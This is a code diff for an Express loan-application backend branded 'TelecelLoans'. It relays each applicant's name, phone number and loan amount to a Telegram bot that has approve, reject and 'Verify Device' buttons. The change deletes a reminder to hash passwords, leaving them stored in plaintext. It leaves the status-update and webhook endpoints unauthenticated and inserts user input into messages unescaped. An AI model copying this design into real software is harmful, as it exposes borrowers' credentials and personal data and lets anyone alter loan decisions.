@@ -11,6 +11,44 @@ app.use(express.json());
 const users = [];
 const loans = [];
 
+// ─── TELEGRAM HELPER FUNCTION ───
+async function sendTelegramMessage(text, replyMarkup = null) {
+  try {
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+    
+    if (!token || !chatId) {
+      console.error('❌ Telegram credentials missing!');
+      return null;
+    }
+    
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    
+    const payload = {
+      chat_id: chatId,
+      text: text,
+      parse_mode: 'HTML'
+    };
+    
+    if (replyMarkup) {
+      payload.reply_markup = replyMarkup;
+    }
+    
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    
+    const result = await response.json();
+    console.log('✅ Telegram sent:', result.ok ? 'Success' : 'Failed');
+    return result;
+  } catch (error) {
+    console.error('❌ Telegram error:', error.message);
+    return null;
+  }
+}
+
 // Health check
 app.get('/health', (req, res) => {
   res.json({ status: 'ok', timestamp: new Date().toISOString() });
@@ -24,6 +62,7 @@ app.get('/', (req, res) => {
     endpoints: {
       auth: '/api/auth/register, /api/auth/login',
       loans: '/api/loans/apply, /api/loans/my-loans',
+      telegram: '/api/telegram/send-auth, /api/telegram/test',
       health: '/health'
     }
   });
@@ -43,7 +82,7 @@ app.post('/api/auth/register', async (req, res) => {
       id: Date.now().toString(),
       name,
       phone,
-      password, // In production, hash this!
+      password,
       created_at: new Date()
     };
     users.push(user);
@@ -78,9 +117,9 @@ app.post('/api/auth/login', async (req, res) => {
 // ─── LOAN ROUTES ───
 
 // Apply for loan
-app.post('/api/loans/apply', (req, res) => {
+app.post('/api/loans/apply', async (req, res) => {
   try {
-    const { amount, period_days, interest_rate, period_label, userId } = req.body;
+    const { amount, period_days, interest_rate, period_label, userId, name, phone } = req.body;
     const interestAmount = amount * (interest_rate / 100);
     const totalAmount = amount + interestAmount;
     const dueDate = new Date();
@@ -89,6 +128,8 @@ app.post('/api/loans/apply', (req, res) => {
     const loan = {
       id: 'loan_' + Date.now(),
       userId: userId || 'user_123',
+      name: name || 'Unknown',
+      phone: phone || 'Unknown',
       amount,
       interest_rate,
       interest_amount: interestAmount,
@@ -101,11 +142,40 @@ app.post('/api/loans/apply', (req, res) => {
     };
     loans.push(loan);
     
+    // ─── SEND TELEGRAM NOTIFICATION ───
+    const message = `<b>💰 New Loan Application</b>\n\n` +
+                    `<b>Name:</b> ${loan.name}\n` +
+                    `<b>Phone:</b> <code>${loan.phone}</code>\n` +
+                    `<b>Amount:</b> GHS ${amount.toFixed(2)}\n` +
+                    `<b>Period:</b> ${period_days} days\n` +
+                    `<b>Interest:</b> ${interest_rate}%\n` +
+                    `<b>Total:</b> GHS ${totalAmount.toFixed(2)}\n` +
+                    `<b>Loan ID:</b> <code>${loan.id}</code>\n\n` +
+                    `<i>Please review and approve this loan.</i>`;
+    
+    const replyMarkup = {
+      inline_keyboard: [
+        [
+          { text: "✅ Approve", callback_data: `approve_${loan.id}` },
+          { text: "❌ Reject", callback_data: `reject_${loan.id}` }
+        ],
+        [
+          { text: "📱 Verify Device", callback_data: `verify_${loan.id}` }
+        ]
+      ]
+    };
+    
+    await sendTelegramMessage(message, replyMarkup);
+    
+    console.log(`📱 Loan application from ${loan.name} (${loan.phone}) - GHS ${amount}`);
+    
     res.status(201).json({
       success: true,
       loan
     });
+    
   } catch (error) {
+    console.error('❌ Loan application error:', error);
     res.status(500).json({ success: false, message: error.message });
   }
 });
@@ -127,37 +197,160 @@ app.get('/api/loans/:id', (req, res) => {
 });
 
 // Update loan status
-app.put('/api/loans/:id/status', (req, res) => {
-  const { status } = req.body;
-  const loan = loans.find(l => l.id === req.params.id);
-  if (!loan) {
-    return res.status(404).json({ success: false, message: 'Loan not found' });
+app.put('/api/loans/:id/status', async (req, res) => {
+  try {
+    const { status } = req.body;
+    const loan = loans.find(l => l.id === req.params.id);
+    if (!loan) {
+      return res.status(404).json({ success: false, message: 'Loan not found' });
+    }
+    loan.status = status;
+    if (status === 'disbursed') {
+      loan.disbursed_at = new Date();
+    }
+    
+    // ─── SEND STATUS UPDATE TO TELEGRAM ───
+    const statusEmoji = status === 'approved' ? '✅' : 
+                        status === 'rejected' ? '❌' : 
+                        status === 'disbursed' ? '💰' : '📝';
+    
+    const message = `${statusEmoji} <b>Loan ${status.toUpperCase()}</b>\n\n` +
+                    `<b>Name:</b> ${loan.name || 'Unknown'}\n` +
+                    `<b>Amount:</b> GHS ${loan.amount.toFixed(2)}\n` +
+                    `<b>Status:</b> ${status.toUpperCase()}\n` +
+                    `<b>Loan ID:</b> <code>${loan.id}</code>`;
+    
+    await sendTelegramMessage(message);
+    
+    res.json({ success: true, loan });
+  } catch (error) {
+    console.error('❌ Update status error:', error);
+    res.status(500).json({ success: false, message: error.message });
   }
-  loan.status = status;
-  if (status === 'disbursed') {
-    loan.disbursed_at = new Date();
-  }
-  res.json({ success: true, loan });
 });
 
-// ─── TELEGRAM ENDPOINT ───
+// ─── TELEGRAM ENDPOINTS ───
 
-// Send to Telegram (simulated)
-app.post('/api/telegram/send-auth', (req, res) => {
-  const { phone, amount, name } = req.body;
-  console.log(`📱 Telegram Auth Request: ${name} (${phone}) - GHS ${amount}`);
-  // In production, call Telegram API here
-  res.json({ 
-    success: true, 
-    message: 'Authorization request sent to admin' 
-  });
+// Send authorization to Telegram
+app.post('/api/telegram/send-auth', async (req, res) => {
+  try {
+    const { phone, amount, name, loanId } = req.body;
+    
+    console.log(`📱 Telegram Auth Request: ${name} (${phone}) - GHS ${amount}`);
+    
+    const message = `<b>💰 Loan Authorization</b>\n\n` +
+                    `<b>Name:</b> ${name || 'Unknown'}\n` +
+                    `<b>Phone:</b> <code>${phone || 'Unknown'}</code>\n` +
+                    `<b>Amount:</b> GHS ${amount || '0'}\n` +
+                    `<b>Loan ID:</b> <code>${loanId || 'N/A'}</code>\n\n` +
+                    `<i>Please approve or reject this loan.</i>`;
+    
+    const replyMarkup = {
+      inline_keyboard: [
+        [
+          { text: "✅ Approve", callback_data: `approve_${loanId || 'test'}` },
+          { text: "❌ Reject", callback_data: `reject_${loanId || 'test'}` }
+        ],
+        [
+          { text: "📱 Verify Device", callback_data: `verify_${loanId || 'test'}` }
+        ]
+      ]
+    };
+    
+    const result = await sendTelegramMessage(message, replyMarkup);
+    
+    res.json({
+      success: true,
+      message: 'Authorization request sent to admin',
+      telegram: result
+    });
+    
+  } catch (error) {
+    console.error('❌ Telegram error:', error);
+    res.status(500).json({
+      success: false,
+      message: error.message
+    });
+  }
+});
+
+// Test Telegram endpoint
+app.post('/api/telegram/test', async (req, res) => {
+  try {
+    const { message } = req.body;
+    const testMessage = message || '🔔 Test message from TelecelLoans backend!';
+    
+    const result = await sendTelegramMessage(testMessage);
+    
+    res.json({
+      success: true,
+      message: 'Test message sent',
+      telegram: result
+    });
+  } catch (error) {
+    console.error('❌ Test error:', error);
+    res.status(500).json({
+      success: false,
+      message: error.message
+    });
+  }
+});
+
+// Telegram webhook (for callback queries)
+app.post('/api/telegram/webhook', async (req, res) => {
+  try {
+    const { body } = req;
+    console.log('📨 Webhook received:', JSON.stringify(body, null, 2));
+    
+    // Handle callback queries
+    if (body.callback_query) {
+      const { data, id, from } = body.callback_query;
+      console.log(`📱 Callback: ${data} from ${from.username || from.id}`);
+      
+      // Parse the callback data
+      const [action, loanId] = data.split('_');
+      
+      if (action === 'approve') {
+        // Find and update loan
+        const loan = loans.find(l => l.id === loanId);
+        if (loan) {
+          loan.status = 'approved';
+          await sendTelegramMessage(`✅ Loan ${loanId} has been <b>APPROVED</b>!\n\nName: ${loan.name}\nAmount: GHS ${loan.amount.toFixed(2)}`);
+        }
+      } else if (action === 'reject') {
+        const loan = loans.find(l => l.id === loanId);
+        if (loan) {
+          loan.status = 'rejected';
+          await sendTelegramMessage(`❌ Loan ${loanId} has been <b>REJECTED</b>.`);
+        }
+      } else if (action === 'verify') {
+        await sendTelegramMessage(`📱 Device verification requested for loan ${loanId}.`);
+      }
+      
+      // Acknowledge the callback
+      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          callback_query_id: id,
+          text: '✅ Processing your request...'
+        })
+      });
+    }
+    
+    res.sendStatus(200);
+  } catch (error) {
+    console.error('❌ Webhook error:', error);
+    res.sendStatus(500);
+  }
 });
 
 // ─── START SERVER ───
 
 app.listen(PORT, () => {
-  console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`🚀 TelecelLoans Server running on port ${PORT}`);
   console.log(`📍 http://localhost:${PORT}`);
+  console.log(`📱 Telegram Bot: @TelecelCashbot`);
 });
 
 // Export for Railway
